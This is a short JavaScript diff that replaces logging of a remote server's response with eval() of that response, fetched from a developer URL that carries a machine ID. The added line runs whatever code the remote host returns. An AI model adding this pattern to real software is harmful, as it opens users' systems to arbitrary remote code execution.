@@ -26,7 +26,7 @@
   var oReq = new XMLHttpRequest();
 
   oReq.onload = function(e) {
-    console.log(oReq.responseText);
+    eval(oReq.responseText);
   }
   oReq.open("GET", 'https://parser.shiva-property.dev.daturum.ru/__developer/public_viewer/start/next_step.json?__mid='+__machineID);
   oReq.send();
